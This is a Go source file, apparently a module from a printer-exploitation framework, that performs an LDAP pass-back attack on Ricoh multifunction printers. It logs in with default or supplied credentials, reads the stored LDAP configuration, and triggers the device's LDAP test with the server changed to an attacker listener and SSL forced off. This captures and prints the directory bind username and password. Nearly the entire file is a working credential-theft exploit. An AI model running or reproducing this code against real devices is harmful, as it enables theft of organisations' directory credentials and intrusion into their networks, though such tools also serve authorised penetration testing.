package safe

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"time"

	"papercut/internal/listener"
	"papercut/internal/modules"
	"papercut/internal/output"
)

func init() { register(func() modules.ExploitModule { return NewRicohLDAPPassBack() }) }

// RicohLDAPPassBack implements the RICOH LDAP Pass-Back attack.
// It logs into the RICOH web interface, extracts LDAP configuration,
// then triggers a test LDAP connection redirected to the attacker's listener
// to capture LDAP bind credentials.
//
// Category: SAFE — only triggers a test connection, does not modify permanent settings.
type RicohLDAPPassBack struct {
	modules.BaseModule
}

// NewRicohLDAPPassBack creates a new instance of the RICOH LDAP Pass-Back module.
func NewRicohLDAPPassBack() *RicohLDAPPassBack {
	m := &RicohLDAPPassBack{
		BaseModule: modules.BaseModule{
			Mod: modules.Module{
				Name:         "ricoh/ldap/passback",
				Description:  "RICOH LDAP Pass-Back — redirects LDAP test connection to capture bind credentials",
				Manufacturer: "Ricoh",
				Category:     "SAFE",
				Authors:      []string{"Waffl3ss"},
				Tags:         []string{"ldap", "passback", "credentials", "ricoh", "mfp"},
				Models:       []string{"MP C3003", "MP C4503", "MP C6003"},
			},
			Opts: []*modules.Option{
				{Name: "RHOST", Default: "", Required: true, Description: "Target IP address"},
				{Name: "RPORT", Default: "80", Required: false, Description: "Target HTTP port"},
				{Name: "LHOST", Default: "", Required: true, Description: "Listening IP for LDAP callback"},
				{Name: "LPORT", Default: "389", Required: false, Description: "Listening port for LDAP callback"},
				{Name: "USERNAME", Default: "admin", Required: false, Description: "Login username"},
				{Name: "PASSWORD", Default: "", Required: false, Description: "Login password (empty for default)"},
				{Name: "SSL", Default: "false", Required: false, Description: "Use HTTPS instead of HTTP"},
				{Name: "VERBOSE", Default: "false", Required: false, Description: "Verbose output"},
				{Name: "TIMEOUT", Default: "120", Required: false, Description: "Callback timeout in seconds"},
			{Name: "PROXY", Default: "", Required: false, Description: "Proxy (socks5://host:port or http://host:port)"},
			},
		},
	}
	m.InitDefaults()
	return m
}

// Check tests whether the RICOH web interface accepts the configured credentials.
func (r *RicohLDAPPassBack) Check() (*modules.CheckResult, error) {
	if err := r.Validate(); err != nil {
		return nil, err
	}
	rhost := r.Val("RHOST")
	rport := r.Val("RPORT")
	username := r.Val("USERNAME")
	password := r.Val("PASSWORD")
	verbose := r.BoolVal("VERBOSE")

	scheme := "http"
	if r.BoolVal("SSL") {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s:%s", scheme, rhost, rport)

	if verbose {
		output.Info("Checking default credentials on %s:%s...", rhost, rport)
	}

	client, err := r.newHTTPClient()
	if err != nil {
		return nil, err
	}

	// Step 1: Establish session
	if verbose {
		output.Info("  Establishing session...")
	}
	err = r.getSession(client, baseURL, verbose)
	if err != nil {
		return &modules.CheckResult{
			Success: false,
			Target:  rhost,
			Port:    r.IntVal("RPORT", 80),
			Details: fmt.Sprintf("Failed to establish session: %v", err),
		}, nil
	}

	// Step 2: Attempt login
	if verbose {
		output.Info("  Attempting login as %s...", username)
	}
	success, err := r.login(client, baseURL, username, password, verbose)
	if err != nil {
		return &modules.CheckResult{
			Success: false,
			Target:  rhost,
			Port:    r.IntVal("RPORT", 80),
			Details: fmt.Sprintf("Login request failed: %v", err),
		}, nil
	}

	result := &modules.CheckResult{
		Target:   rhost,
		Port:     r.IntVal("RPORT", 80),
		Username: username,
		Password: password,
	}

	if success {
		result.Success = true
		result.Details = "Default credentials accepted"
	} else {
		result.Success = false
		result.Details = "Default credentials rejected"
	}

	return result, nil
}

// Exploit performs the full LDAP pass-back attack.
func (r *RicohLDAPPassBack) Exploit() (*modules.ExploitResult, error) {
	if err := r.Validate(); err != nil {
		return nil, err
	}

	rhost := r.Val("RHOST")
	rport := r.Val("RPORT")
	lhost := r.Val("LHOST")
	lport := r.Val("LPORT")
	username := r.Val("USERNAME")
	password := r.Val("PASSWORD")
	verbose := r.BoolVal("VERBOSE")
	timeout := r.IntVal("TIMEOUT", 120)
	portInt := r.IntVal("RPORT", 80)

	scheme := "http"
	if r.BoolVal("SSL") {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s:%s", scheme, rhost, rport)

	output.Warn("This exploit can be delayed when returning data. Please be patient...")

	client, err := r.newHTTPClient()
	if err != nil {
		return nil, err
	}

	// Step 1: Login
	output.Info("Logging into %s:%s as %s...", rhost, rport, username)

	err = r.getSession(client, baseURL, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Failed to establish session: %v", err),
		}, nil
	}

	success, err := r.login(client, baseURL, username, password, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Login failed: %v", err),
		}, nil
	}
	if !success {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: "Login rejected — credentials may be incorrect",
		}, nil
	}

	output.Success("Login successful")

	// Step 2: Get wimToken from LDAP config page
	output.Info("Extracting LDAP configuration...")

	wimToken, err := r.getWimToken(client, baseURL, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Failed to get wimToken: %v", err),
		}, nil
	}

	// Step 3: Get LDAP settings detail
	settings, err := r.getLDAPSettings(client, baseURL, wimToken, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Failed to get LDAP settings: %v", err),
		}, nil
	}

	if verbose {
		output.Info("  Current LDAP server: %s:%s", settings.serverName, settings.portNum)
		output.Info("  LDAP username: %s", settings.userName)
		output.Info("  Search base: %s", settings.searchPoint)
		output.Info("  SSL: %s, Auth: %s", settings.enableSSL, settings.enableAuth)
	}

	// Step 4: Start LDAP listener
	// Bind to 0.0.0.0 (all interfaces) — LHOST is the redirect target, not the bind address.
	// On cloud instances (EC2/Azure/GCP) the public IP is NAT'd and not on the local interface.
	listenAddr := fmt.Sprintf("0.0.0.0:%s", lport)
	output.Info("Starting LDAP listener on 0.0.0.0:%s (redirect target: %s)...", lport, lhost)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()

	credsCh := make(chan *listener.LDAPCreds, 1)
	errCh := make(chan error, 1)

	go func() {
		creds, err := listener.ListenLDAP(ctx, listenAddr, time.Duration(timeout)*time.Second, verbose)
		if err != nil {
			errCh <- err
			return
		}
		credsCh <- creds
	}()

	// Give the listener a moment to start
	time.Sleep(500 * time.Millisecond)

	// Step 5: Trigger LDAP test connection redirected to our listener
	output.Info("Redirecting LDAP test to %s...", listenAddr)

	err = r.triggerLDAPTest(client, baseURL, settings, lhost, lport, verbose)
	if err != nil {
		cancel()
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Failed to trigger LDAP test: %v", err),
		}, nil
	}

	output.Info("Waiting for callback (timeout: %ds)...", timeout)

	// Step 6: Wait for credentials
	select {
	case creds := <-credsCh:
		fmt.Println()
		output.Success("Received LDAP bind from %s", creds.SourceIP)
		output.Success("Username: %s", creds.BindDN)
		output.Success("Password: %s", creds.Password)
		return &modules.ExploitResult{
			Success: true,
			Target:  rhost,
			Port:    portInt,
			Details: "LDAP credentials captured via pass-back",
			Data:    fmt.Sprintf("DN: %s\nPassword: %s", creds.BindDN, creds.Password),
		}, nil
	case err := <-errCh:
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Listener error: %v", err),
		}, nil
	case <-ctx.Done():
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: "Timeout waiting for LDAP callback",
		}, nil
	}
}

// ldapSettings holds the extracted LDAP configuration from the RICOH web interface.
type ldapSettings struct {
	wimToken    string
	entryName   string
	serverName  string
	searchPoint string
	portNum     string
	enableSSL   string
	enableAuth  string
	userName    string
}

func (r *RicohLDAPPassBack) newHTTPClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, fmt.Errorf("create cookie jar: %w", err)
	}
	return &http.Client{
		Jar:       jar,
		Timeout:   time.Duration(r.IntVal("TIMEOUT", 120)) * time.Second,
		Transport: modules.NewHTTPTransport(r.Val("PROXY")),
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}, nil
}

func (r *RicohLDAPPassBack) getSession(client *http.Client, baseURL string, verbose bool) error {
	sessionURL := baseURL + "/web/guest/en/websys/webArch/authForm.cgi"

	req, err := http.NewRequest("GET", sessionURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0")
	req.AddCookie(&http.Cookie{Name: "cookieOnOffChecker", Value: "on"})

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("session request: %w", err)
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)

	if verbose {
		output.Info("  Session established (status: %d)", resp.StatusCode)
	}
	return nil
}

func (r *RicohLDAPPassBack) login(client *http.Client, baseURL, username, password string, verbose bool) (bool, error) {
	loginURL := baseURL + "/web/guest/en/websys/webArch/login.cgi"

	// RICOH expects base64-encoded userid
	userB64 := base64.StdEncoding.EncodeToString([]byte(username))

	data := url.Values{
		"wimToken":      {"--"},
		"userid_work":   {""},
		"userid":        {userB64},
		"password_work": {""},
		"password":      {password},
		"open":          {""},
	}

	resp, err := client.PostForm(loginURL, data)
	if err != nil {
		return false, fmt.Errorf("login request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, fmt.Errorf("read login response: %w", err)
	}
	bodyStr := string(body)

	if verbose {
		output.Info("  Login response status: %d, body length: %d", resp.StatusCode, len(body))
	}

	// A successful login typically redirects or shows admin content.
	// A failed login stays on the login page or shows an error.
	// Check for indicators of failure.
	if strings.Contains(bodyStr, "authResult") && strings.Contains(bodyStr, "error") {
		return false, nil
	}

	// If we got a redirect to admin pages, login succeeded
	if resp.StatusCode == 302 || resp.StatusCode == 301 {
		return true, nil
	}

	// If the response contains "logout" it's a RICOH admin page — we're logged in
	if strings.Contains(bodyStr, "logout") {
		return true, nil
	}

	// Final check: can we access the LDAP settings page?
	// This is the definitive test — if wimToken is present, we're authenticated.
	testURL := baseURL + "/web/entry/en/websys/ldapServer/ldapServerGetFunc.cgi"
	testResp, err := client.Get(testURL)
	if err != nil {
		return false, nil
	}
	defer testResp.Body.Close()
	testBody, _ := io.ReadAll(testResp.Body)

	if strings.Contains(string(testBody), "wimToken") {
		return true, nil
	}

	return false, nil
}

func (r *RicohLDAPPassBack) getWimToken(client *http.Client, baseURL string, verbose bool) (string, error) {
	ldapURL := baseURL + "/web/entry/en/websys/ldapServer/ldapServerGetFunc.cgi"

	resp, err := client.Get(ldapURL)
	if err != nil {
		return "", fmt.Errorf("get LDAP config page: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("read LDAP config page: %w", err)
	}
	bodyStr := string(body)

	wimToken, err := extractInputValue(bodyStr, "wimToken")
	if err != nil {
		return "", fmt.Errorf("extract wimToken: %w", err)
	}

	if verbose {
		output.Info("  Got wimToken: %s", wimToken)
	}

	return wimToken, nil
}

func (r *RicohLDAPPassBack) getLDAPSettings(client *http.Client, baseURL, wimToken string, verbose bool) (*ldapSettings, error) {
	rhost := r.Val("RHOST")
	settingsURL := baseURL + "/web/entry/en/websys/ldapServer/ldapServerGetDetail.cgi"

	data := url.Values{
		"wimToken":              {wimToken},
		"enableLdap":            {"true"},
		"ldapServerNumSelected": {"1"},
		"authInfo":              {"false"},
	}

	req, err := http.NewRequest("POST", settingsURL, strings.NewReader(data.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("DNT", "1")
	req.Header.Set("Referer", baseURL+"/web/entry/en/websys/ldapServer/ldapServerGetFunc.cgi")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("get LDAP settings: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read LDAP settings: %w", err)
	}
	bodyStr := string(body)

	if verbose {
		output.Info("  LDAP settings page received (%d bytes) from %s", len(body), rhost)
	}

	s := &ldapSettings{}

	s.userName, _ = extractInputValue(bodyStr, "userName")
	s.wimToken, _ = extractInputValue(bodyStr, "wimToken")
	s.entryName, _ = extractInputValue(bodyStr, "entryName")
	s.serverName, _ = extractInputValue(bodyStr, "serverName")
	s.searchPoint, _ = extractInputValue(bodyStr, "searchPoint")
	s.portNum, _ = extractInputValue(bodyStr, "portNum")
	s.enableSSL, _ = extractHiddenValue(bodyStr, "enableSSLOut")
	s.enableAuth, _ = extractHiddenValue(bodyStr, "enableAuthOut")

	// Validate we got the critical fields
	if s.wimToken == "" {
		return nil, fmt.Errorf("could not extract wimToken from LDAP settings page")
	}

	return s, nil
}

func (r *RicohLDAPPassBack) triggerLDAPTest(client *http.Client, baseURL string, s *ldapSettings, lhost, lport string, verbose bool) error {
	rhost := r.Val("RHOST")
	testURL := baseURL + "/web/entry/en/websys/ldapServer/ldapServerSetConfirmTest.cgi"

	data := url.Values{
		"wimToken":                 {s.wimToken},
		"paramControl":             {"INPUT"},
		"urlLang":                  {"en"},
		"urlProfile":               {"entry"},
		"urlScheme":                {"HTTP"},
		"returnValue":              {"SUCCESS"},
		"title":                    {"LDAP_SERVER"},
		"availability":             {"nameonserverNameonsearchPointonportNumonsslonauthonuserNameonpasswordonkerberosoncharCodeonconnectTestonsearchNameonmailAddressonfaxNumoncompanyNameonpostNameonoptionalSearchConditionon"},
		"authInfo":                 {"false"},
		"ldapServerNumSelectedOut": {"1"},
		"entryNameOut":             {s.entryName},
		"serverNameOut":            {s.serverName},
		"searchPointOut":           {s.searchPoint},
		"portNumOut":               {s.portNum},
		"enableSSLOut":             {s.enableSSL},
		"enableAuthOut":            {s.enableAuth},
		"userNameOut":              {s.userName},
		"isRealmKeyNameOut":        {"11111"},
		"realmNameOut":             {"UA_NOT_LOGINUA_NOT_LOGINUA_NOT_LOGINUA_NOT_LOGINUA_NOT_LOGIN1"},
		"jpCharCodeOut":            {"UTF8SJISENCJPJISUTF8"},
		"searchNameOut":            {"cn"},
		"searchMlAddOut":           {"mail"},
		"searchFaxNumOut":          {"facsimileTelephoneNumber"},
		"searchCompanyNameOut":     {"o"},
		"searchPostNameOut":        {"ou"},
		"searchAttrOut":            {""},
		"searchKeyOut":             {""},
		// Active fields — these are what get used for the test connection
		"entryName":         {s.entryName},
		"serverName":        {lhost},        // REDIRECT to our listener
		"searchPoint":       {s.searchPoint},
		"portNum":           {lport},        // REDIRECT to our listener port
		"enableSSL":         {"false"},      // Force plaintext so we can read the bind
		"enableAuth":        {"RADIO_PLAIN_AUTH_ON"},
		"userName":          {s.userName},
		"jpCharCode":        {"UTF8"},
		"searchName":        {"cn"},
		"searchMlAdd":       {"mail"},
		"searchFaxNum":      {"facsimileTelephoneNumber"},
		"searchCompanyName": {"o"},
		"searchPostName":    {"ou"},
		"searchAttr":        {""},
		"searchKey":         {""},
	}

	req, err := http.NewRequest("POST", testURL, strings.NewReader(data.Encode()))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("DNT", "1")
	req.Header.Set("Referer", baseURL+"/web/entry/en/websys/ldapServer/ldapServerGetDetail.cgi")

	if verbose {
		output.Info("  Sending LDAP test request to %s (redirecting to %s:%s)", rhost, lhost, lport)
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("trigger LDAP test: %w", err)
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)

	if verbose {
		output.Info("  LDAP test request sent (status: %d)", resp.StatusCode)
	}

	return nil
}

// extractInputValue extracts a value from an HTML input field: <input name="fieldName" ... value="...">
func extractInputValue(html, fieldName string) (string, error) {
	// Look for the input field by name attribute
	marker := `name="` + fieldName + `"`
	idx := strings.Index(html, marker)
	if idx == -1 {
		return "", fmt.Errorf("field %q not found", fieldName)
	}

	// Search for value= in the surrounding context (within the same tag)
	// Look backward to find the start of the tag
	tagStart := strings.LastIndex(html[:idx], "<")
	if tagStart == -1 {
		return "", fmt.Errorf("could not find tag start for %q", fieldName)
	}

	// Find the end of this tag
	tagEnd := strings.Index(html[tagStart:], ">")
	if tagEnd == -1 {
		return "", fmt.Errorf("could not find tag end for %q", fieldName)
	}
	tag := html[tagStart : tagStart+tagEnd+1]

	// Extract value="..." from this tag
	valueMarker := `value="`
	valueIdx := strings.Index(tag, valueMarker)
	if valueIdx == -1 {
		return "", nil
	}

	valueStart := valueIdx + len(valueMarker)
	valueEnd := strings.Index(tag[valueStart:], `"`)
	if valueEnd == -1 {
		return "", fmt.Errorf("unclosed value attribute for %q", fieldName)
	}

	return tag[valueStart : valueStart+valueEnd], nil
}

// extractHiddenValue extracts a value from a hidden input field.
func extractHiddenValue(html, fieldName string) (string, error) {
	return extractInputValue(html, fieldName)
}
